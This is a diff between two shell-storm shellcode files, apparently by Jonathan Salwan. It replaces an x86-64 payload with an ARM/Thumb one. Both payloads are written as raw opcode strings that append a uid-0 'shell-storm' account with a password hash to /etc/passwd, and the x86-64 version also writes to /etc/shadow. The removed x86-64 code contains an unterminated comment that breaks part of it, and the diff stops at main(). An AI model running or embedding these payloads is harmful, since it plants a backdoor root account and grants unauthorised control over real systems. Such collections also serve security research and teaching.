@@ -1,134 +1,77 @@
 /*
-Title:  Linux/x86-64 - Add root user with password - 390 bytes
-Date:   2010-06-20
-Tested: Archlinux x86_64 k2.6.33
- 
-Author: Jonathan Salwan
-Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
- 
-! Database of shellcodes http://www.shell-storm.org/shellcode/
-
-
-
-Add root user with password:
-                             - User: shell-storm
-                             - Pass: leet
-                             - id  : 0
+** Title:     Linux/ARM - add root user with password - 151 bytes
+** Date:      2010-11-25
+** Tested on: ARM926EJ-S rev 5 (v5l)
+** Author:    Jonathan Salwan - twitter: @jonathansalwan
+**
+** http://shell-storm.org
+**
+** Informations:
+** -------------
+**               - user: shell-storm
+**               - pswd: toor
+**               - uid : 0
 */
 
 #include <stdio.h>
 
 
-	char *SC = 
-			/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 01204) */
-			
-			"\x48\xbb\xff\xff\xff\xff\xff\x73\x77\x64"       /* mov    $0x647773ffffffffff,%rbx */
-			"\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
-			"\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73"       /* mov    $0x7361702f6374652f,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\x89\xe7"                                   /* mov    %rsp,%rdi */
-                        "\x66\xbe\x41\x04"                               /* mov    $0x441,%si */
-                        "\x66\xba\x84\x02"                               /* mov    $0x284,%dx */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x02"                                       /* mov    $0x2,%al */
-                        "\x0f\x05"                                       /* syscall */
+char SC[] = 
+            /* Thumb mode */
+            "\x05\x50\x45\xe0"  /* sub  r5, r5, r5 */
+            "\x01\x50\x8f\xe2"  /* add  r5, pc, #1 */
+            "\x15\xff\x2f\xe1"  /* bx   r5 */
 
-                        /* write(3, "shell-storm:x:0:0:shell-storm.or"..., 46) */
+            /* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 0644) = fd */
+            "\x78\x46"          /* mov  r0, pc */
+            "\x7C\x30"          /* adds r0, #124 */
+            "\xff\x21"          /* movs r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\xff\x31"          /* adds r1, #255 */
+            "\x45\x31"          /* adds r1, #69 */
+            "\xdc\x22"          /* movs r2, #220 */
+            "\xc8\x32"          /* adds r2, #200 */
+            "\x05\x27"          /* movs r7, #5 */
+            "\x01\xdf"          /* svc  1 */
 
-                        "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
-                        "\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
-                        "\x48\xbb\xff\xff\x2f\x62\x61\x73\x68\x0a"       /* mov    $0xa687361622fffff,%rbx */
-                        "\x48\xc1\xeb\x10"                               /* shr    $0x10,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x67\x3a\x2f\x3a\x2f\x62\x69\x6e"       /* mov    $0x6e69622f3a2f3a67,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x73\x74\x6f\x72\x6d\x2e\x6f\x72"       /* mov    $0x726f2e6d726f7473,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x30\x3a\x73\x68\x65\x6c\x6c\x2d"       /* mov    $0x2d6c6c6568733a30,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x6f\x72\x6d\x3a\x78\x3a\x30\x3a"       /* mov    $0x3a303a783a6d726f,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74"       /* mov    $0x74732d6c6c656873,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\x89\xe6"                                   /* mov    %rsp,%rsi */
-                        "\x48\xba\xff\xff\xff\xff\xff\xff\xff\x2e"       /* mov    $0x2effffffffffffff,%rdx */
-                        "\x48\xc1\xea\x38"                               /* shr    $0x38,%rdx */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x01"                                       /* mov    $0x1,%al */
-                        "\x0f\x05"                                       /* syscall */
+            /* r8 = fd */
+            "\x80\x46"          /* mov  r8, r0 */
 
-                        /* close(3) */
+            /* write(fd, "shell-storm:$1$KQYl/yru$PMt02zUTW"..., 72) */
+            "\x41\x46"          /* mov  r1, r8 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x79\x46"          /* mov  r1, pc */
+            "\x18\x31"          /* adds r1, #24 */
+            "\xc0\x46"          /* nop (mov r8, r8) */
+            "\x48\x22"          /* movs r2, #72 */
+            "\x04\x27"          /* movs r7, #4 */
+            "\x01\xdf"          /* svc  1 */
 
-                        "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
-                        "\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x03"                                       /* mov    $0x3,%al */
-                        "\x0f\x05"                                       /* syscall */
+            /* close(fd) */
+            "\x41\x46"          /* mov  r1, r8 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x06\x27"          /* movs r7, #6 */
+            "\x01\xdf"          /* svc  1 */
 
-                        /* Xor */
+            /* exit(0) */
+            "\x1a\x49"          /* subs r1, r1, r1 */
+            "\x08\x1c"          /* adds r0, r1, #0 */
+            "\x01\x27"          /* movs r7, #1 */
+            "\x01\xdf"          /* svc  1 */
 
-                        "\x48\x31\xdb"                                   /* xor    %rbx,%rbx */
-                        "\x48\x31\xff"                                   /* xor    %rdi,%rdi */
-                        "\x48\x31\xf6"                                   /* xor    %rsi,%rsi */
-                        "\x48\x31\xd2"                                   /* xor    %rdx,%rdx */
+            /* shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n */
+            "\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72"
+            "\x6d\x3a\x24\x31\x24\x4b\x51\x59\x6c\x2f"
+            "\x79\x72\x75\x24\x50\x4d\x74\x30\x32\x7a"
+            "\x55\x54\x57\x6d\x4d\x76\x50\x57\x63\x55"
+            "\x34\x6f\x51\x4c\x73\x2f\x3a\x30\x3a\x30"
+            "\x3a\x72\x6f\x6f\x74\x3a\x2f\x72\x6f\x6f"
+            "\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73"
+            "\x68\x0a"
 
-                        /* open("/etc/shadow", O_WRONLY|O_CREAT|O_APPEND, 01204) */
-
-                        "\x48\xbb\xff\xff\xff\xff\xff\x64\x6f\x77"       /* mov    $0x776f64ffffffffff,%rbx */
-                        "\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x2f\x65\x74\x63\x2f\x73\x68\x61"       /* mov    $0x6168732f6374652f,%rbx  */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\x89\xe7"                                   /* mov    %rsp,%rdi */
-                        "\x66\xbe\x41\x04"                               /* mov    $0x441,%si */
-                        "\x66\xba\x84\x02"                               /* mov    $0x284,%dx */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x02"                                       /* mov    $0x2,%al */
-                        "\x0f\x05"                                       /* syscall *
-
-                        /* write(3, "shell-storm:$1$reWE7GM1$axeMg6LT"..., 59) */
-			
-                        "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
-                        "\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
-                        "\x48\xbb\xff\xff\xff\xff\xff\x3a\x3a\x0a"       /* mov    $0xa3a3affffffffff,%rbx */
-                        "\x48\xc1\xeb\x28"                               /* shr    $0x28,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x34\x37\x37\x38\x3a\x3a\x3a\x3a"       /* mov    $0x3a3a3a3a38373734,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x5a\x30\x55\x33\x4d\x2f\x3a\x31"       /* mov    $0x313a2f4d3355305a,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x73\x2f\x50\x64\x53\x67\x63\x46"       /* mov    $0x4663675364502f73,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x61\x78\x65\x4d\x67\x36\x4c\x54"       /* mov    $0x544c36674d657861,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x65\x57\x45\x37\x47\x4d\x31\x24"	 /* mov    $0x24314d4737455765,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x6f\x72\x6d\x3a\x24\x31\x24\x72"       /* mov    $0x722431243a6d726f,%rbx  */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74"       /* mov    $0x74732d6c6c656873,%rbx */
-                        "\x53"                                           /* push   %rbx */
-                        "\x48\x89\xe6"                                   /* mov    %rsp,%rsi */
-                        "\x48\xba\xff\xff\xff\xff\xff\xff\xff\x3b"       /* mov    $0x3bffffffffffffff,%rdx */
-                        "\x48\xc1\xea\x38"                               /* shr    $0x38,%rdx */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x01"                                       /* mov    $0x1,%al */
-                        "\x0f\x05"                                       /* syscall */		
-
-                        /* close(3) */
-
-                        "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"       /* mov    $0x3ffffffffffffff,%rdi */
-                        "\x48\xc1\xef\x38"                               /* shr    $0x38,%rdi */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x03"                                       /* mov    $0x3,%al */
-                        "\x0f\x05"                                       /* syscall */
-
-                        /* _exit(0) */
-
-                        "\x48\x31\xff"                                   /* xor    %rdi,%rdi */
-                        "\x48\x31\xc0"                                   /* xor    %rax,%rax */
-                        "\xb0\x3c"                                       /* mov    $0x3c,%al */
-                        "\x0f\x05";                                      /* syscall */
+            /* /etc/passwd */
+            "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
 
 
 int main(void)
